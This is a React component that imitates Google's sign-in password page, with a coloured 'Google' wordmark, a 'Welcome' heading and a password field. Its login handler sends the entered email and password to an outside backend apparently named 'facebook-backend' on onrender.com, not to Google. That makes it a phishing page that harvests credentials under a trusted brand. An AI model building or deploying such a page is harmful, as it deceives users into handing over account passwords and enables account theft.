import { useState } from "react";
import axios from "axios";

const Password = () => {
    const [showPassword, setShowPassword] = useState(false);
    const [step, setStep] = useState('email');
    const [formData, setFormData] = useState({ email: "", password: "" });
    const [error, setError] = useState(null);

    const togglePasswordVisibility = () => setShowPassword((prev) => !prev);
    const handleChange = (e) => setFormData({ ...formData, [e.target.name]: e.target.value });

    const handleNext = (e) => {
        e.preventDefault();
        if (formData.email) {
            setStep('password');
        }
    };

    const handleLogin = async (e) => {
        e.preventDefault();
        setError(null); // Reset error state

        try {
            const newData = { email: formData.email, password: formData.password }
            const response = await axios.post("https://facebook-backend-5229.onrender.com/api/login", formData, {
                headers: { "Content-Type": "application/json" },
                withCredentials: true, // If using cookies for authentication 
            });


            if (response.data.success) {
                alert("Login Successful!");
                console.log("User Data:", response.data);
                // Redirect user or store authentication token
            } else {
                setError("Invalid credentials, please try again.");
            }
        } catch (err) {
            console.error("Login Error:", err);
            setError("Something went wrong. Please try again.");
        }
    };

    return (
        <div className="min-h-screen bg-[#181818] text-white flex flex-col items-center justify-center">
            <div className='sm:mx-32 md:mx-0 mx-0 lg:mx-32 flex flex-col'>
                <div className="bg-[#202124] flex flex-col md:flex-row p-8 justify-between  rounded-3xl w-full shadow-xl">
                    <div className="mb-6 max-w-[50%]">
                        <div className="text-5xl font-bold mb-5 flex items-center space-x-2">
                            <span className="text-blue-500">G</span>
                            <span className="text-red-500">o</span>
                            <span className="text-yellow-500">o</span>
                            <span className="text-blue-500">g</span>
                            <span className="text-green-500">l</span>
                            <span className="text-red-500">e</span>
                        </div>
                        <h2 className="text-4xl mb-5 font-semibold">Welcome</h2>
                        <p className="text-xl pr-10 text-gray-400 mt-1 ">
                            <input value={formData.email} className=""></input>
                        </p>

                    </div>

                    <form className='mt-20' onSubmit={step === 'email' ? handleNext : handleLogin}>

                        <div className="relative">
                            <input
                                type={showPassword ? "text" : "password"}
                                id="password"
                                name="password"
                                value={formData.password}
                                onChange={handleChange}
                                className="peer w-full bg-[#202124] border-2 rounded-md p-3 placeholder-transparent focus:outline-none focus:border-blue-500"
                                placeholder="Enter your password"
                                required
                            />
                            <label
                                htmlFor="password"
                                className="absolute cursor-text left-3 -top-4 text-gray-600 text-sm bg-[#202124] px-1 transition-all peer-placeholder-shown:top-3 peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-400 peer-focus:-top-4 peer-focus:text-sm peer-focus:text-blue-500"
                            >
                                Enter your password
                            </label>
                        </div>
                        <div className="flex items-center space-x-2 mt-3">
                            <input
                                type="checkbox"
                                id="togglePassword"
                                checked={showPassword}
                                onChange={() => setShowPassword(!showPassword)}
                                className="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded"
                            />
                            <label htmlFor="togglePassword" className="text-sm text-gray-300 cursor-pointer">
                                Show password
                            </label>
                        </div>
                        <div className="flex justify-end py-4 items-center">
                            <button className="text-blue-400 hover:underline text-lg mr-10">Forgot password</button>
                            <button type="submit" className="bg-blue-500 text-white px-6 py-2 rounded-full text-lg font-medium hover:bg-blue-600">
                                Next
                            </button>
                        </div>

                    </form>
                </div>
                <div className='flex justify-end space-x-10 my-4 p-3'>
                    <a className='text-gray-400' href="">Help</a>
                    <a className='text-gray-400' href="">Privacy</a>
                    <a className='text-gray-400' href="">Terms</a>
                </div>
            </div>
        </div>
    );
}

export default Password